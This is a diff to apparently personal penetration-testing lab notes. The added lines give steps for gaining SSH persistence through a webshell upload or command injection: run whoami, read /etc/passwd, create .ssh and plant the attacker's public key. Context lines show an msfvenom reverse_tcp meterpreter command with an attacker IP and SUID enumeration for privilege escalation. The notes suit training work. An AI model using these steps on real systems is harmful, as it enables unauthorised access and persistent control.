@@ -43,7 +43,18 @@ Web Exploitation:
     open firefox and type "localhost:[local port]" in the search bar
   - if you see an upload page, and you can upload successfully, you can upload a webshell to do an:
     - SSH keygen:
-      - 
+      - you can do this through a file upload page
+        - If you can file upload:
+          - upload your webshell to the page
+        - If you can do command injection:
+          - find a page you can do command injection on and run whoami
+          - if something is returned, you can do command injection
+          - cat /etc/passwd to find your user's home directory
+          - mkdir/touch .ssh in the home directory
+          - ssh-keygen -t .rsa <- creates a new ssh key
+          - grab id_rsa.pub <- MAKE SURE YOU UPLOAD YOUR PUBLIC KEY
+          - copy the entire line from ssh-keygen on your opstation into the exploitable field on the website (the same you ran whoami in)
+          - if this works you'll be able to ssh as the user you generated the key as w/no password
   - if you find a single line command bar or radio buttons you can try:
     - SQL injection: 
       - on a page showing tables you can type a GET request in the url
@@ -88,6 +99,7 @@ Privilege Escalation:
     - msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.5 lport=5555 -b "\x00" -f python <- msfvenom syntax
     - THE BUFFER OVERFLOW SCRIPT IS ALREADY CREATED - just change ip and port
     - type shell in meterpreter to drop into a shell
+    - LINUX BUFFER OVERFLOW - bufferoverflow.sh 
   - SUID/SGID bits:
     - for all of these: for each file found, go on gtfobins and look through EACH FILE until you find the one you can escalate 
     - to find SUID bits - run find / -type f -perm /4000 [SUID bit set] -ls 2>/dev/null [don't forget the bit bucket]
@@ -108,4 +120,3 @@ Privilege Escalation:
           -b "\x00" -f exe > [file name].exe
         - restart the box after running the new .exe file
         - SCP from Windows grabbing file from Linux
-    - 
